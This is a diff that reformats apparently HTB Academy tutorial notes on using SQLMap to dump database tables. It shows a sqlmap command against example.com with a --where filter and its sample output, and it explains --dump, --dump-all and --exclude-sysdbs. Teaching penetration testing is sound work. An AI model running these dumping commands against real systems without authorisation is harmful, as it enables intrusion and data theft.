@@ -1341,18 +1341,30 @@ Table: users
 
 If there is a requirement to retrieve certain rows based on a known `WHERE` condition (e.g. `name LIKE 'f%'`), we can use the option `--where`, as follows:
 
-shell
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'" ...SNIP... Database: testdb Table: users [1 entry] +----+--------+---------+ | id | name   | surname | +----+--------+---------+ | 2  | fluffy | bunny   | +----+--------+---------+`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
 
----
+...SNIP...
+Database: testdb
 
-## Full DB Enumeration
+Table: users
+[1 entry]
++----+--------+---------+
+| id | name   | surname |
++----+--------+---------+
+| 2  | fluffy | bunny   |
++----+--------+---------+
+```
+<div align="center">
+<br>
+<br>
+</div>
+
+#### Full DB Enumeration
 
 Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option `-T` altogether (e.g. `--dump -D testdb`). By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved.
 
 In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
-
-## Connect
 <div>
 <br>
 <br>
